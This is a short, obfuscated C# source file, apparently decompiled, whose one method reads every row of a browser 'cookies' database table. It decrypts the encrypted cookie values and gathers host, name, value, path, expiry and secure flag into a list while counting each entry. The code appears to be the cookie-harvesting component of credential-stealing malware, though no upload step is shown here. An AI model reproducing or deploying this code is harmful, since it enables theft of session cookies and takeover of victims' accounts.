using System.Collections.Generic;
using ns13;

namespace ns12;

internal sealed class Class48
{
	public static List<Struct2> smethod_0(string string_0)
	{
		try
		{
			List<Struct2> list = new List<Struct2>();
			Class57 @class = Class58.smethod_0(string_0, "cookies");
			if (@class == null)
			{
				return list;
			}
			for (int i = 0; i < @class.method_1(); i++)
			{
				Struct2 item = default(Struct2);
				item.String_5 = Class46.smethod_4(string_0, @class.method_0(i, 12));
				if (item.String_5 == "")
				{
					item.String_5 = @class.method_0(i, 3);
				}
				item.String_0 = Class46.smethod_2(@class.method_0(i, 1));
				item.String_1 = Class46.smethod_2(@class.method_0(i, 2));
				item.String_2 = Class46.smethod_2(@class.method_0(i, 4));
				item.String_3 = Class46.smethod_2(@class.method_0(i, 5));
				item.String_6 = Class46.smethod_2(@class.method_0(i, 6).ToUpper());
				Class53.smethod_4(item.String_0);
				Class54.int_3++;
				list.Add(item);
			}
			return list;
		}
		catch
		{
			return new List<Struct2>();
		}
	}
}
